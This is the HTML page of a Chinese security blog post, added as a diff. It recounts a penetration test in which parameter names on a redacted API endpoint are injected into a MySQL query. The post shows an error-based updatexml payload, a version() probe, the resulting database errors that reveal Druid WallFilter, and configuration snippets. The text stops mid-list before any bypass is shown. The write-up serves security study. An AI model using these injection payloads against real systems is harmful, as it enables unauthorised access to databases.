@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>004-渗透案例：记一次SQL注入_参数名可控 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="MySQL注入druid WallFilter绕过"><meta name="keywords" content='SQLi'>
+  <meta itemprop="name" content="004-渗透案例：记一次SQL注入_参数名可控">
+  <meta itemprop="description" content="MySQL注入druid WallFilter绕过">
+  <meta itemprop="datePublished" content="2026-01-14T10:18:19+00:00">
+  <meta itemprop="dateModified" content="2026-01-14T10:18:19+00:00">
+  <meta itemprop="wordCount" content="1094">
+  <meta itemprop="keywords" content="SQLi"><meta property="og:url" content="http://localhost:1313/posts/case-004-sqli-druid_filter/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="004-渗透案例：记一次SQL注入_参数名可控">
+  <meta property="og:description" content="MySQL注入druid WallFilter绕过">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-14T10:18:19+00:00">
+    <meta property="article:modified_time" content="2026-01-14T10:18:19+00:00">
+    <meta property="article:tag" content="SQLi">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="004-渗透案例：记一次SQL注入_参数名可控">
+  <meta name="twitter:description" content="MySQL注入druid WallFilter绕过">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/case-004-sqli-druid_filter/" title="004-渗透案例：记一次SQL注入_参数名可控 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/cve-2025-55182_react2shell/" title="CVE-2025-55182_React2Shell漏洞分析" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/case-004-sqli-druid_filter/index.md" title="004-渗透案例：记一次SQL注入_参数名可控 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "004-渗透案例：记一次SQL注入_参数名可控",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/case-004-sqli-druid_filter\/"
+    },"genre": "posts","keywords": "SQLi","wordcount":  1094 ,
+    "url": "http:\/\/localhost:1313\/posts\/case-004-sqli-druid_filter\/","datePublished": "2026-01-14T10:18:19+00:00","dateModified": "2026-01-14T10:18:19+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": "MySQL注入druid WallFilter绕过"
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>004-渗透案例：记一次SQL注入_参数名可控</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB/" class="post-category" title="分类 - 案例分享"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 案例分享</a></span></div><div class="post-meta-line"><span title="发布于 2026-01-14 10:18:19"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-14">2026-01-14</time></span>&nbsp;<span title="1094 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1100 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#简述">简述</a></li>
+    <li><a href="#发现过程">发现过程</a>
+      <ul>
+        <li><a href="#绕waf">绕WAF</a></li>
+        <li><a href="#druid-的wallfilter">Druid 的<code>WallFilter</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#参考文献">参考文献</a></li>
+    <li><a href="#文件属性">文件属性</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="简述" class="heading-element"><span>简述</span>
+  <a href="#%e7%ae%80%e8%bf%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>项目上遇到一个有意思的SQL注入，一个GET请求可以自己添加键值，传入的键值会拼接到SQL语句中，造成SQL注入。过程中需要绕过403Waf，和druid WallFilter</p>
+<p>漏洞链接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://xxxxxxx.cn/xxxx-api/xxxx-desk/notice/list?descs=release_time&amp;current=1&amp;size=10&amp;sqli_point=value</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="发现过程" class="heading-element"><span>发现过程</span>
+  <a href="#%e5%8f%91%e7%8e%b0%e8%bf%87%e7%a8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>本来是怀疑 descs 排序点的注入的，通过 XG_SQL插件进行探测，发现还能自己传键值对进去，真有意思
+<a class="lightgallery" href="/posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114174218142.png?size=large" data-thumbnail="/posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114174218142.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114174218142.png" alt="img" srcset="/posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114174218142.png?size=small, /posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114174218142.png?size=medium 1.5x, /posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114174218142.png?size=large 2x" data-title="img" style="--width: 1998px;--aspect-ratio: 1998 / 1532;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
+<p>根据回显的报错语句可以判断，漏洞联接中传入的 sqli_point 会被传输到 LIKE 前，sqli_point 的值则会进行预处理。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">###</span><span class="w"> </span><span class="n">Error</span><span class="w"> </span><span class="n">querying</span><span class="w"> </span><span class="k">database</span><span class="p">.</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">………………</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="k">SQL</span><span class="p">:</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xxxx_notice</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">is_deleted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">order</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="o">?</span><span class="p">)</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">tenant_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;000000&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">……</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="绕waf" class="heading-element"><span>绕WAF</span>
+  <a href="#%e7%bb%95waf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>因为服务端会返回报错语句，第一反应就是尝试报错语句。结果被WAF 403了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?descs=release_time&amp;current=1&amp;size=10&amp;updatexml(1,concat(0x7e,(version()),0x7e),1)=1</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="lightgallery" href="/posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114175500802.png?size=large" data-thumbnail="/posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114175500802.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114175500802.png" alt="img" srcset="/posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114175500802.png?size=small, /posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114175500802.png?size=medium 1.5x, /posts/case-004-sqli-druid_filter/resource/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB-MySQL%E6%B3%A8%E5%85%A5-druid_WallFilter%E7%BB%95%E8%BF%87.assets/file-20260114175500802.png?size=large 2x" data-title="img" style="--width: 681px;--aspect-ratio: 681 / 448;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
+<p>一般都是关键词和语义的过滤，尝试探测waf机制</p>
+<h3 id="druid-的wallfilter" class="heading-element"><span>Druid 的<code>WallFilter</code></span>
+  <a href="#druid-%e7%9a%84wallfilter" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>传入参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?descs=release_time&amp;current=1&amp;size=10&amp;version()=1</span></span></code></pre></td></tr></table>
+</div>
+</div><p>触发报错：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Error</span><span class="w"> </span><span class="n">querying</span><span class="w"> </span><span class="k">database</span><span class="p">.</span><span class="w">  </span><span class="n">Cause</span><span class="p">:</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="k">sql</span><span class="p">.</span><span class="k">SQLException</span><span class="p">:</span><span class="w"> </span><span class="k">sql</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">violation</span><span class="p">,</span><span class="w"> </span><span class="n">dbType</span><span class="w"> </span><span class="n">mysql</span><span class="p">,</span><span class="w"> </span><span class="n">druid</span><span class="o">-</span><span class="k">version</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">16</span><span class="p">,</span><span class="w"> </span><span class="n">deny</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">xxxxx_notice</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">is_deleted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="o">?</span><span class="p">)</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">tenant_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;000000&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据报错发现是 Druid 的 WallFilter SQL 注入防护机制</p>
+<blockquote>
+<p>WallFilter 是阿里巴巴的数据库连接池Druid中一个特殊的 Filter，主要功能是用于监控 SQL 安全，并基于 SQL 语法进行分析，理解其中的 SQL 语义，然后作出智能准确的处理，从而避免 SQL 注入。</p>
+</blockquote>
+<p>Druid 的<code>WallFilter</code>（SQL 防火墙过滤器）是默认开启的，它会检测 SQL 中是否包含黑名单里的函数 / 关键词</p>
+<p>黑名单的配置文件</p>
+<p>Druid 的配置文件（以 Spring Boot 为例）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">spring</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">datasource</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">druid</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="c"># 开启WallFilter（默认开启，此处显式配置）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">wall</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c"># 放行user函数（核心配置）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">config</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="nt">deny-functions</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w">  </span><span class="c"># 清空默认禁用函数，或只保留其他需要禁用的</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="c"># 或精准放行：allow-functions: user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="c"># 补充：如果是旧版配置方式，可直接设置wall.config.denyFunctions=</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>若使用 XML 配置（非 Spring Boot）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;wallConfig&#34;</span> <span class="na">class=</span><span class="s">&#34;com.alibaba.druid.wall.WallConfig&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 清空禁用函数列表，放行user --&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;denyFunctions&#34;</span> <span class="na">value=</span><span class="s">&#34;&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 或只禁用其他函数，保留user：value=&#34;eval,exec,password&#34; --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;wallFilter&#34;</span> <span class="na">class=</span><span class="s">&#34;com.alibaba.druid.wall.WallFilter&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;config&#34;</span> <span class="na">ref=</span><span class="s">&#34;wallConfig&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/bean&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://github.com/alibaba/druid/wiki/WallFilter-%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99"target="_blank" rel="external nofollow noopener noreferrer">alibaba/druid - WallFilter拦截规则</a></p>
+<p> WallFilter 的默认拦截策略是<strong>不允许 SQL 中带有注释</strong></p>
+<p>原因是默认配置下，WallFilter 拦截了如下函数和关键字：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
